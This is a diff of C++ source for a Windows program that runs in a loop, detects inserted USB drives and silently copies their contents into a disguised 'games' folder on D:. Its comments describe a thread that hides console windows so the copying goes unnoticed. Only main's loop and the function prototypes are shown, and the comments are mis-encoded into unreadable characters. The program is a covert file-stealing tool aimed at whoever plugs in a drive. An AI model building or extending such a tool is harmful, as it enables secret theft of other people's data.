@@ -7,34 +7,33 @@
 #include <algorithm>
 using namespace std;
 
-unsigned char i;
 bool active;
 int usbnums;
+unsigned char i;
+char usbname[20];
 char src[20] = "X:\\";
 char dest[20] = "D:\\games\\files[X]\\";
 char dest0[20] = "D:\\games\\files[0]\\";
-char usbname[20];
 vector<string> usbnames;
 
 HANDLE hthread_stare = NULL;
 HANDLE hthread_hide = NULL;
-HANDLE husb = NULL;
 UINT DiskType;
 
 /*-------------------------------------------------------------------------------------------
-void copy(bool default_dest);	//´¦ÀíÄ¬ÈÏ"¿ÉÒÆ¶¯´ÅÅÌ",Í³Ò»¶ªÈëfile[0], ÓĞÃû×ÖµÄ¶ªÈëfile[i]
-DWORD WINAPI hide(LPVOID);		//hideÏß³ÌËÑË÷cmd´°¿Ú£¬Ò»µ©·¢ÏÖ¼´¶ÔÆä½øĞĞÒş²Ø
-DWORD WINAPI stare(LPVOID);	//stare¼àÊÓUÅÌ£¬Ò»µ©ÍË³öactive³Éfalse
-bool checkusbname();	//Í¬ÃûµÄUÅÌ²»´¦Àí
-int checkusb();	//Ö»ÄÜ¸´ÖÆµÚÒ»¸ö²åÈëµÄUÅÌ
+DWORD WINAPI hide(LPVOID);		//hideçº¿ç¨‹æœç´¢cmdçª—å£ï¼Œä¸€æ—¦å‘ç°å³å¯¹å…¶è¿›è¡Œéšè—
+DWORD WINAPI stare(LPVOID);		//stareç›‘è§†Uç›˜ï¼Œä¸€æ—¦é€€å‡ºactiveæˆfalse
+void copy(bool default_dest);		//å¤„ç†é»˜è®¤"å¯ç§»åŠ¨ç£ç›˜",ç»Ÿä¸€ä¸¢å…¥file[0], æœ‰åå­—çš„ä¸¢å…¥file[i]
+bool checkusbname();			//åŒåçš„Uç›˜ä¸å¤„ç†
+int checkusb();				//åªèƒ½å¤åˆ¶ç¬¬ä¸€ä¸ªæ’å…¥çš„Uç›˜
 --------------------------------------------------------------------------------------------*/
-
 
 int main() {
 
 	usbnums = 0;
 
-	while (true) {				
+	while (true) {			
+		
 		sprintf(dest, "D:\\games\\files[%d]\\", usbnums);
 		if (checkusb()) {
 			active = true;
@@ -54,7 +53,7 @@ int main() {
 		} else {
 			Sleep(5000);
 		}
-			
+		
 	}
 	return 0;
 }
